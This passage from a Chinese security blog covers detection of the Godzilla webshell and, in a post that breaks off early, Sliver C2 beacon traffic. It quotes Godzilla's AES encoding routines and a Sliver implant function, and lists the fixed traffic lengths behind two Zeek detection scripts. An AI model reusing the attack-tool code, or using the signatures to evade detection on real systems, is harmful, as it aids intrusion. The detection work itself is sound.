<h2 id="JSP-AES-BASE64"><a href="#JSP-AES-BASE64" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><p>​    JSP WebShell 则采用了AES加密形式，AES加密的key。同样是计算密钥的MD5值，然后取其前16位用于加密。更深入的分析大家可以去参考，这并不是本文的重点。**<a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析</a>**</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.shell = context;</span><br><span class="line">    <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">    <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX();</span><br><span class="line">    <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">    String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">this</span>.key);</span><br><span class="line">    <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher.init(<span class="number">1</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">            <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(<span class="keyword">this</span>.encodeCipher.doFinal(data)))).getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeCipher.doFinal(functions.base64Decode(findStr(data)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h1><p>​        结合上面的分析，传统通过静态特征的匹配方式已不在适用于Godzilla WebShell检测。不过，我们可以将多个特征进行结合实现一个检测的模型来对Godzilla PHP XOR BASE64 WebShell的检测。下面我们来列举一下检测特征：</p>
<ol>
<li><p><strong>频率</strong></p>
<p>Godzilla连接WebShell的时会在一次TCP会话中发起<strong>3</strong>次HTTP POST请求。</p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req.png" alt="image-20211206111919028"></p>
<p>​    注意看下<code>uid</code>均为<code>CbhiAefsstFeAyCM6</code>表示是一次TCP会话请求。</p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_uid.png" alt="image-20211206114412112"></p>
</li>
</ol>
<ol start="2">
<li><p><strong>长度</strong></p>
<p>Godzilla虽然对传输时的<code>payload</code>进行了加密，但是初始连接时3次请求中的内容是固定的，所以通过XOR + BASE64编码后的长度是不变的。</p>
<ul>
<li><p>第一次请求长度（<strong>Value</strong>）：<strong>52216</strong></p>
<p>​    Godzilla加载payload.php文件内容作为<code>payload</code>数据，其中定义了Shell功能所需的一系列函数，Godzilla第一次连接Shell时，会将这些函数定义发送给服务器并存储在session中，后续的Shell操作只需要发送函数名称以及对应的函数参数即可。</p>
</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/PHP-Payload.png" alt="image-20211204004016084"></p>
<ul>
<li><p>第一次响应长度：<strong>0</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_resp.png" alt="image-20211204005107879"></p>
</li>
<li><p>第二次请求长度（<strong>Value</strong>）：<strong>28</strong></p>
<ul>
<li>密文： <code>CQNGDVtRLFJcUmEwNTg1FgEVRg==</code></li>
<li>明文：<code>&#123;&#39;methodName&#39;: &#39;test&#39;&#125;</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_req.png" alt="image-20211204010342657"></p>
</li>
<li><p>第二次响应长度：<strong>64</strong></p>
<ul>
<li>密文：<code>e+06ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==</code></li>
<li>明文：<code>ok</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp.png" alt="image-20211204011821599"></p>
</li>
<li><p>第三次请求长度（<strong>Value</strong>）：<strong>40</strong></p>
<ul>
<li>密文：<code>CQNGDVtRLFJcUmE5NTg1BQEScARHXAFAeFkFWw==</code></li>
<li>明文：<code>&#123;&#39;methodName&#39;: &#39;getBasicsInfo&#39;&#125;</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_req.png" alt="image-20211204012318391"><em>注：第三次响应数据包，不可作为特征提取。因为每个服务器的基础信息不一样，所以返回内容长度也不一样。</em></p>
</li>
</ul>
</li>
<li><p><strong>内容</strong></p>
<p>有的小伙伴会奇怪，都已经加密了还能从内容上做哪些判断。其实还是可以有的，只不过并不是传统的“威胁特征”</p>
<ul>
<li>请求：3次请求中的key均<strong>相等</strong>，此例中为：<code>Happy</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_key.png" alt="image-20211206111328799"></p>
<ul>
<li>响应：响应数据包中首尾各16位数值可满足MD5的提取<code>[a-z0-9]&#123;16&#125;.+[a-z0-9]&#123;16&#125;</code>，且2次响应包中的16位数值均<strong>相等</strong>；</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp_md5.png" alt="image-20211206105322612"></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_resp_md5.png" alt="image-20211206110509962"></p>
</li>
</ol>
<h1 id="检测模型"><a href="#检测模型" class="headerlink" title="检测模型"></a>检测模型</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/image.jpeg" alt="image-20211208151817057"></p>
<h2 id="PHP-XOR-BASE64-1"><a href="#PHP-XOR-BASE64-1" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_PHP_XOR_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">## 使用Summary Statistics Framework（统计框架）对http请求进行测量。</span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (c?$http) &amp;&amp; (c$http?$status_code) &amp;&amp; (c$http?$method) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      ## 第一步，创建一个观察器，将数据添加到观察器中。</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ## 第二步，根据指定的观察流进行处理，此处采用计算唯一值的方式。</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  ## 第三步，创建汇总统计，以便最终对其进行处理。例：当在<span class="number">3</span>秒的时间窗内满足<span class="number">3</span>次阈值将会执行以下逻辑；</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_php_xor_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">3</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## 获取请求参数</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              ## 本例中: Happy=CQNGDVtRLFJcUmEwNTg1FgEVRg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            ## 响应体长度 &gt; <span class="number">0</span>，提取首位各<span class="number">16</span>字节并检查是否满足MD5格式</span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              ## 本例中: <span class="number">52f</span>0f23a94a8a3f0e+<span class="number">06</span>ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==<span class="number">468e329</span>e21eb39e8</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_all_ordered(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              <span class="keyword">if</span> (|server_body_md5| == <span class="number">0</span>)</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                              add md5_str_set[server_body_str];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 &gt; <span class="number">52216</span> &amp;&amp; 响应体长度 = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">52216</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">28</span> &amp;&amp; 响应体长度 = <span class="number">64</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">28</span>) &amp;&amp; (|server_body| == <span class="number">64</span>) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">40</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">40</span> )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            ## 判断<span class="number">3</span>次请求参数是否唯一</span><br><span class="line">                            ## 判断后<span class="number">2</span>次提取的MD5值是否唯一</span><br><span class="line">                            <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_PHP_XOR_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(PHP_XOR_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSP-AES-BASE64-1"><a href="#JSP-AES-BASE64-1" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_JSP_AES_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( c?$http &amp;&amp; c$http?$status_code &amp;&amp; c$http?$method )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">5</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## 获取 WebShell Password Key</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_last(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              add md5_str_set[server_body_md5];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 &gt; <span class="number">48500</span> &amp;&amp; 响应体长度 = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">48500</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">64</span> &amp;&amp; 响应体长度 = <span class="number">76</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">64</span>) &amp;&amp; (|server_body| == <span class="number">76</span>) &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">88</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">88</span> &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          ## 判断<span class="number">3</span>次请求体中Password Key 是否唯一、判断<span class="number">2</span>、<span class="number">3</span>次的响应体中的是否MD5是否唯一</span><br><span class="line">                          <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_JSP_AES_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(JSP_AES_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="模型验证"><a href="#模型验证" class="headerlink" title="模型验证"></a>模型验证</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla-v4_Detected.gif" alt="Godzilla v4 Detected"></p>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
        <tag>NIDS</tag>
      </tags>
  </entry>
  <entry>
    <title>How to use Zeek Detect Sliver HTTP beacon traffic</title>
    <url>/2023/11/08/Zeek-Detect-Sliver/</url>
    <content><![CDATA[<p>​    废话少说，今天来给大家分享，如何利用Zeek实现对 <a href="https://github.com/BishopFox/sliver/">Sliver</a> Framework 中 HTTP C2 流量的检测。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/Sliver.png" alt="image-20231103173433297"></p>
<h4 id="Sliver是什么？我反手就是一个GPT"><a href="#Sliver是什么？我反手就是一个GPT" class="headerlink" title="Sliver是什么？我反手就是一个GPT!"></a>Sliver是什么？我反手就是一个GPT!</h4><p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231103173433297.png" alt="image-20231103173433297"></p>
<hr>
<h4 id="Sliver-HTTP-C2-流量检测思路"><a href="#Sliver-HTTP-C2-流量检测思路" class="headerlink" title="Sliver HTTP C2 流量检测思路"></a>Sliver HTTP C2 流量检测思路</h4><p>我们此次的检测思路是针对Sliver HTTP beacon traffic进行检测，也就是我们俗称的“<strong>心跳</strong>”包。以下为分析与检测思路：</p>
<ol>
<li><p>当你第一次启动时，Client 会通过一个POST请求与Server进行通讯，它的主要目的是与 Server 进行密钥(Session Key)交换。Sliver 为了规避流量检测，Client在每次连接Server时的请求都是随机的。同时 Sliver HTTP C2的定制化程度很高，用户只需修改<code>http-c2.json</code>中的对应配置项即可实现uri部分的定制化。以下截图为分别3次执行Client端后的POST请求，第1张图截图是修改默认配置项之后的uri的样子。</p>
<p>第一次：</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231104203402427.png" alt="image-20231104203402427"></p>
<p>第二次：</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231104203213374.png" alt="image-20231104203213374"></p>
<p>第三次：</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231104203502838.png" alt="image-20231104203502838"></p>
<p>​    如上所示，如果你想从uri（<code>session_paths/session_files.session_file_ext</code>）这个角度去检测基本不太可能，因为绕过的成本太低了。所以，我们必须另辟蹊径。通过分析源码，我们将检测目标放在了这些看似“随机”生成的请求参数上。以第一次的POST请求来看，参数<code>ib=6578885j6</code>是基于时间戳生成的一次性密钥（TOTP），另一个参数<code>i=8148k7556</code>是经过混淆之后的EncoderID。<em>其实Body的长度也是一个特征，只不过必须在解码之后才能作为特征，这里没有纳入进去是因为Zeek在有些编码上的解码暂时无法实现。</em></p>
<hr>
<h5 id="废话少说，放“码”过来"><a href="#废话少说，放“码”过来" class="headerlink" title="废话少说，放“码”过来"></a>废话少说，放“码”过来</h5><ul>
<li><p>参数<code>ib=6578885j6</code>是怎么来的？</p>
<p>该参数是由 <a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/transports/httpclient/httpclient.go#L211">OTPQueryArgument</a> 方法生成。此方法将会基于时间戳随机生成一个长度为2的字符串作为Key，并同时在<code>value</code>（密钥）中插入0到2个随机字符作为Value。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231108103916316.png" alt="image-20231108103916316"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// OTPQueryArgument - Adds an OTP query argument to the URL</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SliverHTTPClient)</span> <span class="title">OTPQueryArgument</span><span class="params">(uri *url.URL, value <span class="keyword">string</span>)</span> *<span class="title">url</span>.<span class="title">URL</span></span> &#123;</span><br><span class="line">	values := uri.Query()</span><br><span class="line">	key1 := nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))]</span><br><span class="line">	key2 := nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; insecureRand.Intn(<span class="number">3</span>); i++ &#123;</span><br><span class="line">		index := insecureRand.Intn(<span class="built_in">len</span>(value))</span><br><span class="line">		char := <span class="keyword">string</span>(nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))])</span><br><span class="line">		value = value[:index] + char + value[index:]</span><br><span class="line">	&#125;</span><br><span class="line">	values.Add(<span class="keyword">string</span>([]<span class="keyword">byte</span>&#123;key1, key2&#125;), value)</span><br><span class="line">	uri.RawQuery = values.Encode()</span><br><span class="line">	<span class="keyword">return</span> uri</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>参数<code>i=8148k7556</code>是怎么来的？</p>
